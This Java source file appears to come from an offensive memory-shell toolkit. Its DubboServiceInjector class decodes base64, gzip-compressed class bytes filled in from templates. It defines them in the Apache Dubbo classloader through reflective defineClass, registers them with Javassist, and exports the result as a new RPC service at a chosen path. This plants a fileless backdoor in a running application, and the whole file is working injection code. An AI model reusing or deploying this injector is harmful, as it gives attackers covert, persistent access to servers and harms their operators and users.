package com.reajason.javaweb.memshell.injector.dubbo;

import org.apache.dubbo.common.bytecode.ClassGenerator;
import org.apache.dubbo.common.utils.ClassUtils;
import org.apache.dubbo.common.utils.NetUtils;
import org.apache.dubbo.config.ProtocolConfig;
import org.apache.dubbo.config.RegistryConfig;
import org.apache.dubbo.config.ServiceConfig;
import org.apache.dubbo.config.context.ConfigManager;
import org.apache.dubbo.rpc.model.ApplicationModel;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;
import java.util.zip.GZIPInputStream;

public class DubboServiceInjector {
    private final Map<String, ServiceConfig<?>> dynamicServices = new ConcurrentHashMap<>();
    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public String getHelperBase64String() {
        return "{{helperBase64String}}";
    }

    public DubboServiceInjector() {
        if (ok) {
            return;
        }
        try {
            msg += registerService();
        } catch (Throwable e) {
            msg += "unexcepted error: " + getErrorMessage(e);
        }
        ok = true;
        System.out.println(msg);
    }

    private Class<?> getShell(String base64String) throws Exception {
        ClassLoader classLoader = ClassUtils.getClassLoader(ClassGenerator.class);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(base64String));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
                    String.class, byte[].class, int.class, int.class, java.security.ProtectionDomain.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, null, clazzByte, 0, clazzByte.length,
                    ClassGenerator.class.getProtectionDomain());
            registerInJavassistClassPool(classLoader, clazzByte);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz;
    }

    private void registerInJavassistClassPool(ClassLoader classLoader, byte[] classBytes) {
        try {
            Object pool = ClassGenerator.getClassPool(classLoader);
            pool.getClass().getMethod("makeClass", java.io.InputStream.class)
                    .invoke(pool, new ByteArrayInputStream(classBytes));
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    public String registerService() throws Throwable {
        String normalizedPath = normalizePath(getUrlPattern());
        if (normalizedPath.isEmpty()) {
            throw new IllegalArgumentException("path must not be empty");
        }

        if (dynamicServices.containsKey(normalizedPath)) {
            return resolveServiceAddresses(normalizedPath);
        }

        if (isPathRegisteredInFramework(normalizedPath)) {
            return resolveServiceAddresses(normalizedPath);
        }
        Class<?> interfaceClass = getShell(getHelperBase64String());
        Class<?> implementationClass = getShell(getBase64String());
        validateServiceTypes(interfaceClass, implementationClass);

        Object serviceInstance = instantiate(implementationClass);
        ServiceConfig<Object> serviceConfig = createServiceConfig(normalizedPath, interfaceClass, serviceInstance);
        ServiceConfig<?> previous = dynamicServices.putIfAbsent(normalizedPath, serviceConfig);
        if (previous != null) {
            return resolveServiceAddresses(normalizedPath);
        }

        try {
            serviceConfig.export();
            return resolveServiceAddresses(normalizedPath);
        } catch (RuntimeException e) {
            dynamicServices.remove(normalizedPath, serviceConfig);
            throw e;
        }
    }

    @SuppressWarnings("all")
    private boolean isPathRegisteredInFramework(String path) {
        try {
            for (Object service : getRegisteredServices()) {
                try {
                    Method getPath = service.getClass().getMethod("getPath");
                    if (path.equals(getPath.invoke(service))) {
                        return true;
                    }
                } catch (Exception ignored) {
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    @SuppressWarnings("all")
    private Collection<?> getRegisteredServices() {
        try {
            ConfigManager configManager = ApplicationModel.getConfigManager();
            Method getServices = configManager.getClass().getMethod("getServices");
            return (Collection<?>) getServices.invoke(configManager);
        } catch (Exception e) {
            try {
                Method defaultModel = ApplicationModel.class.getMethod("defaultModel");
                Object model = defaultModel.invoke(null);
                Method getDefaultModule = model.getClass().getMethod("getDefaultModule");
                Object moduleModel = getDefaultModule.invoke(model);
                Method getConfigManager = moduleModel.getClass().getMethod("getConfigManager");
                Object moduleConfigManager = getConfigManager.invoke(moduleModel);
                Method getServices = moduleConfigManager.getClass().getMethod("getServices");
                return (Collection<?>) getServices.invoke(moduleConfigManager);
            } catch (Exception ex) {
                return new ArrayList<>();
            }
        }
    }

    private String normalizePath(String path) {
        if (path == null) {
            return "";
        }
        String normalized = path.trim();
        while (normalized.startsWith("/")) {
            normalized = normalized.substring(1);
        }
        return normalized;
    }

    private void validateServiceTypes(Class<?> interfaceClass, Class<?> implementationClass) {
        if (!interfaceClass.isInterface()) {
            throw new IllegalArgumentException("not an interface: " + interfaceClass.getName());
        }
        if (implementationClass.isInterface() || Modifier.isAbstract(implementationClass.getModifiers())) {
            throw new IllegalArgumentException("implementation class is not instantiable: " + implementationClass.getName());
        }
        if (!interfaceClass.isAssignableFrom(implementationClass)) {
            throw new IllegalArgumentException(implementationClass.getName()
                    + " does not implement " + interfaceClass.getName());
        }
    }

    private Object instantiate(Class<?> implementationClass) {
        try {
            Constructor<?> constructor = implementationClass.getDeclaredConstructor();
            constructor.setAccessible(true);
            return constructor.newInstance();
        } catch (ReflectiveOperationException e) {
            throw new IllegalArgumentException("failed to instantiate " + implementationClass.getName(), e);
        }
    }

    @SuppressWarnings({"rawtypes", "unchecked"})
    private ServiceConfig<Object> createServiceConfig(String path, Class<?> interfaceClass, Object serviceInstance) {
        ConfigManager configManager = ApplicationModel.getConfigManager();

        ServiceConfig serviceConfig = new ServiceConfig();
        serviceConfig.setInterface(interfaceClass);
        serviceConfig.setRef(serviceInstance);
        serviceConfig.setPath(path);
        serviceConfig.setVersion("1.0.0");
        serviceConfig.setProxy("jdk");
        serviceConfig.setApplication(configManager.getApplication().orElse(null));

        List<ProtocolConfig> protocols = new ArrayList<>(configManager.getDefaultProtocols());
        if (protocols.isEmpty()) {
            protocols = new ArrayList<>(configManager.getProtocols());
        }
        serviceConfig.setProtocols(protocols);

        List<RegistryConfig> registries = new ArrayList<>(configManager.getDefaultRegistries());
        if (registries.isEmpty()) {
            registries = new ArrayList<>(configManager.getRegistries());
        }
        serviceConfig.setRegistries(registries);

        return serviceConfig;
    }

    private String resolveServiceAddresses(String path) {
        ConfigManager configManager = ApplicationModel.getConfigManager();
        List<ProtocolConfig> protocols = configManager.getDefaultProtocols();
        if (protocols.isEmpty()) {
            protocols = new ArrayList<>(configManager.getProtocols());
        }
        if (protocols.isEmpty()) {
            return path;
        }
        String localHost = NetUtils.getLocalHost();
        return protocols.stream()
                .map(pc -> String.format("%s://%s:%d/%s", pc.getName(), localHost, pc.getPort(), path))
                .collect(Collectors.joining(", "));
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
